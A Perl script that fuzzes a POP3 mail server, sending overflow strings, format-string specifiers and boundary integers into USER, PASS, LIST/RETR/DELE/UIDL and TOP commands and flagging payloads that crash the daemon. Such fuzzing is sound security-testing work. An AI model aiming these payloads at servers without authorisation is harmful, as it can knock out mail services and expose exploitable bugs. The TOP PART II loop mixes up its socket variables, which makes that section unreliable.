#!/usr/bin/perl -w
use IO::Socket;
use Thread;
$|=1;

print "Please DISABLE firewall daemon of this operating system first, Thank you!\n";

$host=shift;
$port="110";

if(!defined($host)){
	print("usage: $0 \$host\n");
	exit(0);
}

$check_first=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
if(defined $check_first){
	print "$host -> $port is alive.\n";
	$check_first->close;
}else{
	die("$host -> $port is closed!\n");
}

@bfo=(
'A'x5,
'A'x17,
'A'x33,
'A'x65,
'A'x76,
'A'x129,
'A'x257,
'A'x513,
'A'x1024,
'A'x2049,
'A'x4097,
'A'x8193,
'A'x12288,
'A'x30000,
'A'x65535,
'A'x65536
);

@fse=(
'%s%p%x%d',
'024d',
'%.2049d',
'%p%p%p%p',
'%x%x%x%x',
'%d%d%d%d',
'%s%s%s%s',
'%99999999999s',
'%08x',
'%%20d',
'%%20n',
'%%20x',
'%%20s',
'%s%s%s%s%s%s%s%s%s%s',
'%p%p%p%p%p%p%p%p%p%p',
'%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%',
'%s'x129,
'%x'x257
);

@int=(
'-1',
'0',
'0x100',
'0x1000',
'0x3fffffff',
'0x7ffffffe',
'0x7fffffff',
'0x80000000',
'0xfffffffe',
'0xffffffff',
'0x10000',
'0x100000',
'20000',
'65535',
'65536',
'1'
);

@other=(
'@',
'@'x2,
'@'x3,
'@'x5,
'@'x10,
'@'x100,
'@'x1000,
'@'x5000,
'@'x65535,
'@'x65536
);

@all=@bfo;
push(@all, @fse);
push(@all, @int);
push(@all, @other);

sub check(){
	#Thread->self->detach;
	$sock=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined $sock){
		#print "$host -> $port is alive.\n";
		undef($content_tmp);
		$sock->recv($content_tmp,100,0);
		if(length($content_tmp)>0){
			$sock->close;
			return 1;
		}else{
			$sock->close;
			return 0;
		}
	}else{
		#print("$host -> $port is closed!\n");
		return 0;
	}
}

#USERNAME Fuzzing
print "USERNAME Fuzzing.\n";
foreach $username_payload (@all){
	LABEL1: $sock1=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined($sock1)){
		$sock1->recv($content, 500, 0);                      #banner [+OK]
		sleep(2);
		$sock1->send("USER "."$username_payload"."\r\n", 0);
		sleep(2);
		$sock1->recv($content, 500, 0);                      #response
		sleep(5);
		$thread1=Thread->new(\&check);
		if($thread1->join()!=1){
			print "USERNAME Payload is $username_payload.\n";
			print "Press <ENTER> to continue.\n";
			<STDIN>;
		}
		undef($thread1);
		$sock1->send("QUIT\r\n", 0);
		$sock1->close;
		$username_payload_tmp=$username_payload;
	}else{
		print "USERNAME Payload maybe $username_payload_tmp.\n";
		print "$host -> $port is closed!\n";
		print "Please restart remote POP3 Daemon!\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
		goto LABEL1;
	}
}

#PASSWORD Fuzzing
print "PASSWORD Fuzzing.\n";
print "Please enter a valid username: ";
$valid_username=<STDIN>;
chop($valid_username);
foreach $password_payload (@all){
	LABEL2: $sock2=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined($sock2)){
		$sock2->recv($content, 500, 0);                      #banner [+OK]
		sleep(2);
		$sock2->send("USER "."$valid_username"."\r\n", 0);
		sleep(2);
		$sock2->recv($content, 500, 0);                      #response [+OK Password required]
		sleep(2);
		$sock2->send("PASS "."$password_payload"."\r\n", 0);
		sleep(2);
		$sock2->recv($content, 500, 0);                      #response
		sleep(5);
		$thread2=Thread->new(\&check);
		if($thread2->join()!=1){
			print "PASSWORD Payload is $password_payload.\n";
			print "Press <ENTER> to continue.\n";
			<STDIN>;
		}
		undef($thread2);
		$sock2->send("QUIT\r\n", 0);
		$sock2->close;
		$password_payload_tmp=$password_payload;
	}else{
		print "PASSWORD Payload maybe $password_payload_tmp.\n";
		print "$host -> $port is closed!\n";
		print "Please restart remote POP3 Daemon!\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
		goto LABEL2;
	}
}

#Verify username and password
print "Please enter a real username: ";
$real_username=<STDIN>;
chop($real_username);
print "Please enter a real password: ";
$real_password=<STDIN>;
chop($real_password);
$sock3=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60) || die "$host -> $port is closed!\n";
$sock3->recv($content, 500, 0);                      #banner [+OK]
sleep(2);
$sock3->send("USER "."$real_username"."\r\n", 0);
sleep(2);
undef($content);
$sock3->recv($content, 500, 0);                      #response
die "Username is wrong!\n" if(!($content=~/^\+OK/));
sleep(2);
$sock3->send("PASS "."$real_password"."\r\n", 0);
sleep(2);
undef($content);
$sock3->recv($content, 500, 0);                      #response
die "Password is wrong!\n" if(!($content=~/^\+OK/));
$sock3->close;
print "Username and Password is right!\n";

#COMMON COMMAND Fuzzing
@command=(
'LIST',
'RETR',
'DELE',
'UIDL'
);
print "COMMON COMMAND Fuzzing.\n";
foreach $cmd (@command){
	foreach $command_payload (@all){
		LABEL4: $sock4=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
		if(defined($sock4)){
			$sock4->recv($content, 500, 0);                      #banner [+OK]
			sleep(2);
			$sock4->send("USER "."$real_username"."\r\n", 0);
			sleep(2);
			$sock4->recv($content, 500, 0);                      #response [+OK Password required]
			sleep(2);
			$sock4->send("PASS "."$real_password"."\r\n", 0);
			sleep(2);
			$sock4->recv($content, 500, 0);                      #response [+OK maildrop locked and ready]
			sleep(2);
			$sock4->send("$cmd"." "."$command_payload"."\r\n", 0);
			sleep(5);
			$thread4=Thread->new(\&check);
			if($thread4->join()!=1){
				print "COMMAND $cmd Payload is $command_payload.\n";
				print "Press <ENTER> to continue.\n";
				<STDIN>;
			}
			undef($thread4);
			$sock4->send("QUIT\r\n", 0);
			$sock4->close;
			$cmd_tmp=$cmd;
			$command_payload_tmp=$command_payload;
		}else{
			print "COMMAND $cmd_tmp Payload maybe $command_payload_tmp.\n";
			print "$host -> $port is closed!\n";
			print "Please restart remote POP3 Daemon!\n";
			print "Press <ENTER> to continue.\n";
			<STDIN>;
			goto LABEL4;
		}
	}
}

#TOP COMMAND Fuzzing, PART I
print "TOP COMMAND Fuzzing, PART I.\n";
foreach $top_command_payload (@all){
	LABEL5: $sock5=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined($sock5)){
		$sock5->recv($content, 500, 0);                      #banner [+OK]
		sleep(2);
		$sock5->send("USER "."$real_username"."\r\n", 0);
		sleep(2);
		$sock5->recv($content, 500, 0);                      #response [+OK Password required]
		sleep(2);
		$sock5->send("PASS "."$real_password"."\r\n", 0);
		sleep(2);
		$sock5->recv($content, 500, 0);                      #response [+OK maildrop locked and ready]
		sleep(2);
		$sock5->send("top $top_command_payload 1"."\r\n", 0);
		sleep(5);
		$thread5=Thread->new(\&check);
		if($thread5->join()!=1){
			print "TOP COMMAND Payload(PART I) is $top_command_payload.\n";
			print "Press <ENTER> to continue.\n";
			<STDIN>;
		}
		undef($thread5);
		$sock5->send("QUIT\r\n", 0);
		$sock5->close;
		$top_command_payload_tmp=$top_command_payload;
	}else{
		print "TOP COMMAND Payload(PART I) maybe $top_command_payload_tmp.\n";
		print "$host -> $port is closed!\n";
		print "Please restart remote POP3 Daemon!\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
		goto LABEL5;
	}
}

#TOP COMMAND Fuzzing, PART II
print "TOP COMMAND Fuzzing, PART II.\n";
undef($top_command_payload);
undef($top_command_payload_tmp);
foreach $top_command_payload (@all){
	LABEL6: $sock5=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined($sock6)){
		$sock6->recv($content, 500, 0);                      #banner [+OK]
		sleep(2);
		$sock6->send("USER "."$real_username"."\r\n", 0);
		sleep(2);
		$sock6->recv($content, 500, 0);                      #response [+OK Password required]
		sleep(2);
		$sock6->send("PASS "."$real_password"."\r\n", 0);
		sleep(2);
		$sock6->recv($content, 500, 0);                      #response [+OK maildrop locked and ready]
		sleep(2);
		$sock6->send("top 1 $top_command_payload"."\r\n", 0);
		sleep(5);
		$thread6=Thread->new(\&check);
		if($thread6->join()!=1){
			print "TOP COMMAND Payload(PART II) is $top_command_payload.\n";
			print "Press <ENTER> to continue.\n";
			<STDIN>;
		}
		undef($thread6);
		$sock6->send("QUIT\r\n", 0);
		$sock6->close;
		$top_command_payload_tmp=$top_command_payload;
	}else{
		print "TOP COMMAND Payload(PART II) maybe $top_command_payload_tmp.\n";
		print "$host -> $port is closed!\n";
		print "Please restart remote POP3 Daemon!\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
		goto LABEL6;
	}
}

print "Finish!\n";
exit(0);